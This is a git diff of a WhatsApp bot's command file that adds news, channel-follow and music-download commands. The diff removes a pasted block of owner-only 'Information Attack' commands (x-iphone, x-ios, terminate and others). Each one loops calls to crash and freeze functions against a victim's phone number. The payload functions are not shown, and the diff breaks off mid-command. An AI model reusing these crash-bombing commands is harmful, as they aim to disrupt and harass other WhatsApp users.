@@ -561,17 +561,13 @@ function setupCommandHandlers(socket, number) {
               }
 
               case 'menu': {
-    const startTime = socketCreationTime.get(number) || Date.now();
-    const uptime = Math.floor((Date.now() - startTime) / 1000);
-    const hours = Math.floor(uptime / 3600);
-    const minutes = Math.floor((uptime % 3600) / 60);
-    const seconds = Math.floor(uptime % 60);
+                const startTime = socketCreationTime.get(number) || Date.now();
+                const uptime = Math.floor((Date.now() - startTime) / 1000);
+                const hours = Math.floor(uptime / 3600);
+                const minutes = Math.floor((uptime % 3600) / 60);
+                const seconds = Math.floor(uptime % 60);
 
-    // Salam dalam Bahasa Indonesia
-    const greeting = "Halo! Selamat datang di menu LADYBUG!\n\n";
-
-    let menuText = `
-${greeting}
+                let menuText = `
 ┍━❑ ᴍᴏᴏɴ xᴍᴅ ᴍɪɴɪ ❑━━∙∙⊶
 ┃➸╭──────────
 ┃❑│▸ *ʙᴏᴛɴᴀᴍᴇ:* *ᴍᴏᴏɴ xᴍᴅ ᴍɪɴɪ*
@@ -608,7 +604,7 @@ ${greeting}
 │▸ ${config.PREFIX}ɢɪᴛᴄʟᴏɴᴇ
 ┖❑
 
-┎ ❑ *𝐈𝐍𝐅𝐎 𝐌𝐄𝐍𝐔* ❑
+┎ ❑ *I𝐍𝐅𝐎 𝐌𝐄𝐍𝐔* ❑
 │▸ ${config.PREFIX}ɴᴇᴡꜱ
 │▸ ${config.PREFIX}ɴᴀꜱᴀ
 │▸ ${config.PREFIX}ᴄʀɪᴄᴋᴇᴛ
@@ -620,28 +616,65 @@ ${greeting}
 │▸ ${config.PREFIX}ᴅᴇʟᴇᴛᴇᴍᴇ
 ┖❑`;
 
-    await socket.sendMessage(from, {
-        image: { url: config.RCD_IMAGE_PATH },
-        caption: formatMessage(
-            '*M O O N  𝗫 𝗠 𝗗 𝗠𝗜𝗡𝗜*',
-            menuText,
-            'M O O N  𝗫 𝗠 𝗗'
-        ),
-        contextInfo: {
-            mentionedJid: [msg.key.participant || sender],
-            forwardingScore: 999,
-            isForwarded: true,
-            forwardedNewsletterMessageInfo: {
-                newsletterJid: (config.NEWSLETTER_JID || '').trim(),
-                newsletterName: 'M O O N  𝗫 𝗠 𝗗',
-                serverMessageId: 143
-            }
-        }
-    }, { quoted: verifiedContact });
+                await socket.sendMessage(from, {
+                    image: { url: config.RCD_IMAGE_PATH },
+                    caption: formatMessage(
+                        '*M O O N  𝗫 𝗠 𝗗 𝗠𝗜𝗡𝗜*',
+                        menuText,
+                        'M O O N  𝗫 𝗠 𝗗'
+                    ),
+                    contextInfo: {
+                        mentionedJid: [msg.key.participant || sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: (config.NEWSLETTER_JID || '').trim(),
+                            newsletterName: 'M O O N  𝗫 𝗠 𝗗',
+                            serverMessageId: 143
+                        }
+                    }
+                }, { quoted: verifiedContact });
 
-    break;
-}
-            case 'pair': {
+                break;
+              }
+
+              case 'fc': {
+                if (args.length === 0) {
+                    return await socket.sendMessage(sender, {
+                        text: '❗ Please provide a channel JID.\n\nExample:\n.fcn 1203633963799×××@newsletter'
+                    });
+                }
+
+                const jid = args[0];
+                if (!jid.endsWith("@newsletter")) {
+                    return await socket.sendMessage(sender, {
+                        text: '❗ Invalid JID. Please provide a JID ending with `@newsletter`'
+                    });
+                }
+
+                try {
+                    const metadata = await socket.newsletterMetadata("jid", jid);
+                    if (metadata?.viewer_metadata === null) {
+                        await socket.newsletterFollow(jid);
+                        await socket.sendMessage(sender, {
+                            text: `✅ Successfully followed the channel:\n${jid}`
+                        });
+                        console.log(`FOLLOWED CHANNEL: ${jid}`);
+                    } else {
+                        await socket.sendMessage(sender, {
+                            text: `📌 Already following the channel:\n${jid}`
+                        });
+                    }
+                } catch (e) {
+                    console.error('❌ Error in follow channel:', e.message || e);
+                    await socket.sendMessage(sender, {
+                        text: `❌ Error: ${e.message || e}`
+                    });
+                }
+                break;
+              }
+
+              case 'pair': {
                 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
                 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -1197,38 +1230,54 @@ ${greeting}
               }
 
               case 'news': {
-  const newsHeadlines = [
-    {
-      title: "Breaking: Major Event Happens",
-      description: "Details about the major event happening now."
-    },
-    {
-      title: "Economy Updates",
-      description: "Latest updates on the economy and markets."
-    },
-    {
-      title: "Technology News",
-      description: "New advancements in technology announced today."
-    },
-    {
-      title: "Sports Highlights",
-      description: "Highlights from recent sports events."
-    },
-    {
-      title: "Entertainment Buzz",
-      description: "Latest in movies, music, and celebrities."
-    }
-  ];
+                try {
+                    const response = await fetch('https://suhas-bro-api.vercel.app/news/lnw');
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch news from API');
+                    }
+                    const data = await response.json();
 
-  let newsMessage = '📰 *Latest News:*\n\n';
+                    if (!data.status || !data.result || !data.result.title || !data.result.desc || !data.result.date || !data.result.link) {
+                        throw new Error('Invalid news data received');
+                    }
 
-  newsHeadlines.forEach((article, index) => {
-    newsMessage += `${index + 1}. *${article.title}*\n${article.description}\n\n`;
-  });
+                    const { title, desc, date, link } = data.result;
+                    let thumbnailUrl = 'https://via.placeholder.com/150';
+                    try {
+                        const pageResponse = await fetch(link);
+                        if (pageResponse.ok) {
+                            const pageHtml = await pageResponse.text();
+                            const $ = cheerio.load(pageHtml);
+                            const ogImage = $('meta[property="og:image"]').attr('content');
+                            if (ogImage) {
+                                thumbnailUrl = ogImage;
+                            } else {
+                                console.warn(`No og:image found for ${link}`);
+                            }
+                        } else {
+                            console.warn(`Failed to fetch page ${link}: ${pageResponse.status}`);
+                        }
+                    } catch (err) {
+                        console.warn(`Failed to scrape thumbnail from ${link}: ${err.message}`);
+                    }
 
-  await sock.sendMessage(chatId, { text: newsMessage });
-  break;
-}
+                    await socket.sendMessage(sender, {
+                        image: { url: thumbnailUrl },
+                        caption: formatMessage(
+                            '📰 M O O N  𝗫 𝗠 𝗗 📰',
+                            `📢 *${title}*\n\n${desc}\n\n🕒 *Date*: ${date}\n🌐 *Link*: ${link}`,
+                            '> M O O N  𝗫 𝗠 𝗗'
+                        )
+                    });
+                } catch (error) {
+                    console.error(`Error in 'news' case: ${error.message || error}`);
+                    await socket.sendMessage(sender, {
+                        text: '⚠️ news fetch failed.'
+                    });
+                }
+                break;
+              }
+
               case 'cricket': {
                 try {
                     console.log('Fetching cricket news from API...');
@@ -1410,344 +1459,7 @@ ${greeting}
                 }
                 break;
               }
-  case "x-iphone": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
 
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await freezeios(isTarget);
-      await sleep(5000);
-      await freezeios(isTarget);
-      await sleep(5000);
-      await freezeios(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "x-ios": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await inviskillios(isTarget);
-      await sleep(5000);
-      await ioscrashx(isTarget);
-      await inviskillios(isTarget);
-      await sleep(5000);
-      await ioscrashx(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "x-call":
-  case "x-ploit": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await Delay2(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-      await Delay2(isTarget);
-      await sleep(5000);
-      await bulldozer(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "x-mentions": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await bulldozer(isTarget);
-      await sleep(5000);
-      await bulldozer(isTarget);
-      await bulldozer(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "x-brutal": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await superdelayinvid(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "x-system": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await freezechat(isTarget);
-      await sleep(5000);
-      await freezechat(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "iphone-k": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await freezeios(isTarget);
-      await sleep(5000);
-      await freezeios(isTarget);
-      await freezeios(isTarget);
-      await sleep(5000);
-      await freezeios(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "ios-k": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await inviskillios(isTarget);
-      await sleep(5000);
-      await ioscrashx(isTarget);
-      await inviskillios(isTarget);
-      await sleep(5000);
-      await ioscrashx(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "delay-k":
-  case "delay2-k": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await Delay2(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-      await Delay2(isTarget);
-      await sleep(5000);
-      await bulldozer(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "terminate": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await bulldozer(isTarget);
-      await sleep(5000);
-      await bulldozer(isTarget);
-      await bulldozer(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "brutal-k": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await superdelayinvid(isTarget);
-      await sleep(5000);
-      await superdelayinvid(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "system-k": {
-    if (!Access) return reply(mess.owner);
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`);
-    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
-    let isTarget = client + "@s.whatsapp.net";
-
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    let processMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Processing...`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(processMsg);
-
-    for (let r = 0; r < 50; r++) {
-      await freezechat(isTarget);
-      await sleep(5000);
-      await freezechat(isTarget);
-    }
-
-    let successMsg = `*Information Attack*\n*Sender:* ${m.pushName}\n*Target:* ${client}\n*Status:* Success`;
-    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    reply(successMsg);
-    break;
-  }
-
-  case "yt": {
-    if (isBan) return;
-    if (!q) return reply(`*Format Invalid!*\nUse: ${prefix + command} Alan Walker Faded`);
-    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-    try {
-      const yts = require("yt-search");
-      const search = await yts(q);
-      const vid = search.videos[0];
-      if (!vid) return reply("❌ No video results found.");
-      const ytinfo = `
-╭━━〔 *🎬 YOUTUBE SEARCH* 〕━━⬣
-┃ ✦ *Title:* ${vid.title}
-┃ ✦ *Duration:* ${vid.timestamp}
-┃ ✦ *Views:* ${vid.views}
-┃ ✦ *Published:* ${vid.ago}
-┃ ✦ *Channel:* ${vid.author.name}
-┃ ✦ *Link:* ${vid.url}
-╰━━━━━━━━━━━━━━━━━━━━⬣
-_Select format to download:_
-✦ *${prefix}yta ${vid.url}* - Audio
-✦ *${prefix}ytv ${vid.url}* - Video
-      `.trim();
-      await conn.sendMessage(m.chat, {
-        image: { url: vid.thumbnail },
-        caption: ytinfo
-      }, { quoted: m });
-      await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    } catch (err) {
-      console.error(err);
-      reply("❌ Error while searching YouTube.");
-    }
-    break;
-  }
-
-  // Tambahkan command lain sesuai kebutuhan,
-  // Pastikan semua fungsi seperti freezeios(), inviskillios(), ioscrashx(), bulldozer() dan lainnya sudah terdefinisi.
-}
               case 'bible': {
                 try {
                     const reference = args.join(" ");
@@ -1963,184 +1675,201 @@ _Select format to download:_
                 break;
               }
 
+              case 'song':
               case 'play': {
-  const yts = require('yt-search');
-  const axios = require('axios');
+                const AXIOS_DEFAULTS = {
+                    timeout: 60000,
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Accept': 'application/json, text/plain, */*'
+                    }
+                };
 
-  try {
-    const text = message.message?.conversation || message.message?.extendedTextMessage?.text;
-    const searchQuery = text.split(' ').slice(1).join(' ').trim();
+                async function tryRequest(getter, attempts = 3) {
+                    let lastError;
+                    for (let attempt = 1; attempt <= attempts; attempt++) {
+                        try {
+                            return await getter();
+                        } catch (err) {
+                            lastError = err;
+                            if (attempt < attempts) {
+                                await delay(1000 * attempt);
+                            }
+                        }
+                    }
+                    throw lastError;
+                }
 
-    if (!searchQuery) {
-      return await sock.sendMessage(chatId, { 
-        text: "What song do you want to download?"
-      });
-    }
+                async function getIzumiDownloadByUrl(youtubeUrl) {
+                    const apiUrl = `https://izumiiiiiiii.dpdns.org/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=mp3`;
+                    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
+                    if (res?.data?.result?.download) return res.data.result;
+                    throw new Error('Izumi youtube?url returned no download');
+                }
 
-    // Search for the song
-    const { videos } = await yts(searchQuery);
-    if (!videos || videos.length === 0) {
-      return await sock.sendMessage(chatId, { 
-        text: "No songs found!"
-      });
-    }
+                async function getIzumiDownloadByQuery(query) {
+                    const apiUrl = `https://izumiiiiiiii.dpdns.org/downloader/youtube-play?query=${encodeURIComponent(query)}`;
+                    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
+                    if (res?.data?.result?.download) return res.data.result;
+                    throw new Error('Izumi youtube-play returned no download');
+                }
 
-    // Send loading message
-    await sock.sendMessage(chatId, {
-      text: "_Please wait, your download is in progress_"
-    });
+                async function getOkatsuDownloadByUrl(youtubeUrl) {
+                    const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp3?url=${encodeURIComponent(youtubeUrl)}`;
+                    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
+                    if (res?.data?.dl) {
+                        return {
+                            download: res.data.dl,
+                            title: res.data.title,
+                            thumbnail: res.data.thumb
+                        };
+                    }
+                    throw new Error('Okatsu ytmp3 returned no download');
+                }
 
-    // Get the first video result
-    const video = videos[0];
-    const urlYt = video.url;
+                async function sendReaction(emoji) {
+                    try {
+                        await socket.sendMessage(sender, { 
+                            react: { 
+                                text: emoji, 
+                                key: msg.key 
+                            } 
+                        });
+                    } catch (error) {
+                        console.error('Error sending reaction:', error);
+                    }
+                }
 
-    // Fetch audio data from API
-    const response = await axios.get(`https://apis-keith.vercel.app/download/dlmp3?url=${encodeURIComponent(urlYt)}`);
-    const data = response.data;
+                const q = msg.message?.conversation || 
+                          msg.message?.extendedTextMessage?.text || '';
+                
+                const cleanText = q.replace(/^\.(song|play)\s*/i, '').trim();
+                
+                await sendReaction('🎵');
+                
+                if (!cleanText) {
+                    await sendReaction('❓');
+                    await socket.sendMessage(sender, { 
+                        text: '*🎵 M O O N  𝗫 𝗠 𝗗  Music DL 🎵*\n\n*Usage:*\n`.play <song name>`\n`.play <youtube link>`\n\n*Example:*\n`.play shape of you`\n`.play https://youtu.be/JGwWNGJdvx8`' 
+                    }, { quoted: msg });
+                    break;
+                }
 
-    if (!data || !data.status || !data.result || !data.result.downloadUrl) {
-      return await sock.sendMessage(chatId, { 
-        text: "Failed to fetch audio from the API. Please try again later."
-      });
-    }
+                await sendReaction('🔍');
+                
+                const searchingMsg = await socket.sendMessage(sender, { 
+                    text: `*🔍 Searching for:* \`${cleanText}\`\n⏳ Please wait while I find the best audio...` 
+                }, { quoted: msg });
 
-    const audioUrl = data.result.downloadUrl;
-    const title = data.result.title;
+                let video;
+                if (cleanText.includes('youtube.com') || cleanText.includes('youtu.be')) {
+                    video = { 
+                        url: cleanText,
+                        title: 'YouTube Audio',
+                        thumbnail: 'https://i.ytimg.com/vi/default.jpg',
+                        timestamp: '0:00'
+                    };
+                } else {
+                    const yts = require('yt-search');
+                    const search = await yts(cleanText);
+                    if (!search || !search.videos.length) {
+                        await sendReaction('❌');
+                        await socket.sendMessage(sender, { 
+                            text: '*❌ No results found!*\nPlease try a different song name or check your spelling.' 
+                        }, { quoted: msg });
+                        break;
+                    }
+                    video = search.videos[0];
+                }
 
-    // Send the audio
-    await sock.sendMessage(chatId, {
-      audio: { url: audioUrl },
-      mimetype: "audio/mpeg",
-      fileName: `${title}.mp3`
-    }, { quoted: message });
+                await sendReaction('⏳');
+                
+                await socket.sendMessage(sender, { 
+                    text: `*✅ Found: ${video.title}*\n 📥 Downloading...\n*🔄 Please wait...*` 
+                }, { quoted: msg });
 
-  } catch (error) {
-    console.error('Error in play command:', error);
-    await sock.sendMessage(chatId, { 
-      text: "Download failed. Please try again later."
-    });
-  }
-  break;
-}
-case 'video': {
-  const axios = require('axios');
-  const yts = require('yt-search');
+                let audioData;
+                try {
+                    if (video.url && (video.url.includes('youtube.com') || video.url.includes('youtu.be'))) {
+                        audioData = await getIzumiDownloadByUrl(video.url);
+                    } else {
+                        const query = video.title || cleanText;
+                        audioData = await getIzumiDownloadByQuery(query);
+                    }
+                } catch (e1) {
+                    try {
+                        if (video.url) {
+                            audioData = await getOkatsuDownloadByUrl(video.url);
+                        } else {
+                            throw new Error('No valid URL found');
+                        }
+                    } catch (e2) {
+                        await sendReaction('❌');
+                        await socket.sendMessage(sender, { 
+                            text: '*❌ Download failed!*\nAll MP3 download services are currently unavailable.\nPlease try again later.' 
+                        }, { quoted: msg });
+                        break;
+                    }
+                }
 
-  const AXIOS_DEFAULTS = {
-    timeout: 60000,
-    headers: {
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Accept': 'application/json, text/plain, */*'
-    }
-  };
+                let durationSeconds = 0;
+                if (video.timestamp) {
+                    const parts = video.timestamp.split(':').map(Number);
+                    if (parts.length === 3) {
+                        durationSeconds = parts[0] * 3600 + parts[1] * 60 + parts[2];
+                    } else if (parts.length === 2) {
+                        durationSeconds = parts[0] * 60 + parts[1];
+                    }
+                } else if (video.duration) {
+                    durationSeconds = video.duration.seconds || 0;
+                }
 
-  async function tryRequest(getter, attempts = 3) {
-    let lastError;
-    for (let attempt = 1; attempt <= attempts; attempt++) {
-      try {
-        return await getter();
-      } catch (err) {
-        lastError = err;
-        if (attempt < attempts) await new Promise(r => setTimeout(r, 1000 * attempt));
-      }
-    }
-    throw lastError;
-  }
+                await socket.sendMessage(sender, {
+                    image: { url: video.thumbnail || 'https://i.ibb.co/5vJ5Y5J/music-default.jpg' },
+                    caption: `*🎵 M O O N  𝗫 𝗠 𝗗  𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑 🎵*
+*┏━━━━━━━━━━━➤*
+*➤ 🗒️𝐓itle:* ${video.title}
+*➤ ⏱️𝐃uration:* ${video.timestamp || `${durationSeconds} seconds`}
+*➤ 🔊𝐅ormat:* MP3 Audio
 
-  async function getYupraVideoByUrl(youtubeUrl) {
-    const apiUrl = `https://api.yupra.my.id/api/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
-    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
-    if (res?.data?.success && res?.data?.data?.download_url) {
-      return {
-        download: res.data.data.download_url,
-        title: res.data.data.title,
-        thumbnail: res.data.data.thumbnail
-      };
-    }
-    throw new Error('Yupra returned no download');
-  }
+*┗━━━━━━━━━━━━➤*
 
-  async function getOkatsuVideoByUrl(youtubeUrl) {
-    const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
-    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
-    if (res?.data?.result?.mp4) {
-      return { download: res.data.result.mp4, title: res.data.result.title };
-    }
-    throw new Error('Okatsu ytmp4 returned no mp4');
-  }
+*📋 Status:* Sending audio now...`
+                }, { quoted: msg });
 
-  try {
-    const text = message.message?.conversation || message.message?.extendedTextMessage?.text;
-    const searchQuery = text.split(' ').slice(1).join(' ').trim();
+                await sendReaction('⬇️');
+                
+                const fileName = `${video.title || 'song'}.mp3`
+                    .replace(/[<>:"/\\|?*]+/g, '')
+                    .substring(0, 200);
+                
+                const downloadUrl = audioData.download || audioData.dl || audioData.url;
+                
+                if (!downloadUrl || !downloadUrl.startsWith('http')) {
+                    throw new Error('Invalid download URL');
+                }
+                
+                await socket.sendMessage(sender, {
+                    audio: { url: downloadUrl },
+                    mimetype: 'audio/mpeg',
+                    fileName: fileName,
+                    ptt: false,
+                    contextInfo: {
+                        externalAdReply: {
+                            title: video.title || 'MOON XMD',
+                            body: '🎵 MP3 Audio | Powered by Keith Tech',
+                            thumbnailUrl: video.thumbnail,
+                            sourceUrl: video.url || '',
+                            mediaType: 1,
+                            previewType: 0,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, { quoted: msg });
 
-    if (!searchQuery) {
-      await sock.sendMessage(chatId, { text: 'What video do you want to download?' }, { quoted: message });
-      return;
-    }
+                break;
+              }
 
-    // Determine if input is a URL or search query
-    let videoUrl = '';
-    let videoTitle = '';
-    let videoThumbnail = '';
-
-    if (searchQuery.startsWith('http://') || searchQuery.startsWith('https://')) {
-      videoUrl = searchQuery;
-    } else {
